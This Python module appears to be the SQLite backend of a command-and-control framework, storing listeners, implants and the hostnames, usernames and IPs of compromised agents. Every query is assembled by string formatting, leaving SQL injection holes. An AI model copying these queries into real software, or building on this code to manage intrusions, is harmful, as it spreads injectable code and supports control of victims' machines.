import sqlite3
from keyboard import press
import keyboard
from tabulate import tabulate
from werkzeug.serving import make_server
import color
from keyboard import press

class ConnectDatabase:
    def __init__(self):
        self.connection = sqlite3.connect("C2Database.db")
        self.connection.cursor()

    def Connect():
        try:
            connection = sqlite3.connect("C2Database.db")
        except:
            print("Couldnt Connect To The Database!")

    def CreateListener(self, listnername, listenerip, listenerport, listenertype):
        self.connection.execute("INSERT INTO Listeners VALUES ('%s', '%s', %i, '%s')" %(listnername, listenerip, listenerport, listenertype))
        self.connection.commit()

    def ListListener(self):
            results = self.connection.execute("SELECT ListenerName, ListenerIPAddress, ListenerPort FROM Listeners")
            result = results.fetchall()
            data = []
            for i in range(0, len(result)):
                data.append([result[i][0], result[i][1],result[i][2]])
            return data

    def DeleteListener(self, listenername):
        try:
            self.connection.execute("DELETE FROM Listeners WHERE ListenerName='%s'" % listenername)
            self.connection.commit()
            return "The Listener Has '%s' has been deleted!" % listenername

        except:
            print("There was an error please and try to double check if the listener name is correct!")
    
    def ClearDatabase(self):
        try:
            self.connection.execute("DELETE FROM Listeners")
            self.connection.commit()
            self.connection.execute("DELETE FROM Implants")
            self.connection.commit()
            self.connection.execute("DELETE FROM Agents")
            self.connection.commit()
            print(color.red("\n[+] The Database Data Has Been Cleared & Deleted You Have A Fresh Database \n"))
        except:
            print(color.blue("\nThe Database Could Not Be Cleared Maybe You Have A Typo Error, Please Double Check\n"))

    def SaveImplant(self, implantname, key, listenername, listenerip, listenerport):
        self.connection.execute("INSERT INTO Implants(ImplantName, Key, ListenerName, ListenerIP, ListenerPort) VALUES ('%s', '%s', '%s', '%s', '%s')" %(implantname, key, listenername, listenerip, listenerport))
        self.connection.commit()

    def RecordAgent(conn, AgentsKey, HostName, Username, IPAddress):
        try:
            connect = sqlite3.connect("C2Database.db")

            connect.cursor()       

            connect.execute("INSERT INTO Agents(AgentsKey, HostName, Username, IPAddress) VALUES ('%s', '%s', '%s', '%s')" %(AgentsKey, HostName, Username, IPAddress))

            connect.commit()

            return True

        except:
            print ("Error")

        return False
    
    def ListImplants(self):
            results = self.connection.execute("SELECT ImplantName, Key, ListenerName, ListenerIP, ListenerPort FROM Implants")
            result = results.fetchall()
            data = []
            for i in range(0, len(result)):
                data.append([result[i][0], result[i][1],result[i][2], result[i][3], result[i][4]])
            return data